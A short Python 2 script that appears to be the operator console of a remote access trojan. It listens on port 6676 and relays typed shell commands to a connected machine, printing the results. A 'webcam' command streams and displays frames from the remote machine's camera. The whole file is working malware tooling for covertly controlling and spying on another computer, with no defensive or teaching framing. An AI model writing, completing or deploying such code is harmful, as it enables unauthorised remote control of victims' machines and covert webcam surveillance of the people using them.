import socket
import cv2, numpy
import thread

def webcam(conn, addr, cmd):
    conn.send(cmd)
    while True:
        message = []
        while True:
            data = conn.recv(1024 * 1024)
            if not data: break

            else:
                message.append(data)
        stringData = ''.join(message)
        d = numpy.fromstring(stringData, numpy.uint8)

        decimg = cv2.imdecode(d, 1)
        cv2.imshow("Remote - "+str(addr), decimg)

        if cv2.waitKey(5) == 27: break

    cv2.destroyAllWindows()
    

host = ""
port = 6676

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print "[*]Connection established"
cmd = raw_input(">")    
while True:
    if cmd == "quit":
        break

    elif cmd == "webcam":
        thread.start_new_thread(webcam, (conn, addr, cmd))

    else:
        conn.send(cmd)
        data = conn.recv(1024 * 1024)
        print data

    cmd = raw_input()


conn.close()
        
    
        
        
